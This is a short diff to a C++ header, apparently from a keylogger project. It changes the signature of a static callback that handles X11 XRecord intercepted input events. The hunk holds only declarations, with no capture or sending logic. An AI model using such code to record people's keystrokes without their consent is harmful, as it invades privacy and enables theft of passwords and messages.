@@ -65,7 +65,7 @@ private:
   XRecordContext	recContext;
 
   void			setupRecordExtension();
-  static std::string	eventCallback(XPointer priv, XRecordInterceptData *hook);
+  static std::string	&eventCallback(XPointer priv, XRecordInterceptData *hook, std::string&);
 };
 
 #endif /* !__KEYLOGGER_HH__ */
